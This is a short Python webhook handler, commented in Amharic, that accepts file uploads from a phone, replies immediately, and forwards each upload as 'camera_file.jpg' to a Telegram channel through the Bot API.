import os
import json
import requests
from http.server import BaseHTTPRequestHandler

BOT_TOKEN = os.environ.get("BOT_TOKEN")
TELEGRAM_CHANNEL_ID = os.environ.get("TELEGRAM_CHANNEL_ID")

class handler(BaseHTTPRequestHandler):
    def do_POST(self):
        content_type = self.headers.get('Content-Type', '')
        
        if 'multipart/form-data' in content_type:
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            
            # 1. ለስልኩ ወዲያውኑ ምላሽ በመስጠት ግንኙነቱን ማቋረጥ (ስልኩ ቀጣይ ስራ እንዲሰራ)
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({"status": "processing"}).encode('utf-8'))
            
            # 2. ከዚያ በኋላ ፋይሉን በሰላም ወደ ቴሌግራም መላክ
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
            files = {'document': ('camera_file.jpg', post_data)}
            data = {'chat_id': TELEGRAM_CHANNEL_ID}
            
            try:
                requests.post(url, files=files, data=data, timeout=10)
            except:
                pass
            return
                
        else:
            # ለመደበኛ የቴሌግራም ዌብሁክ የሚሆን
            self.send_response(200)
            self.end_headers()
            self.wfile.write(json.dumps({"status": "ok"}).encode('utf-8'))
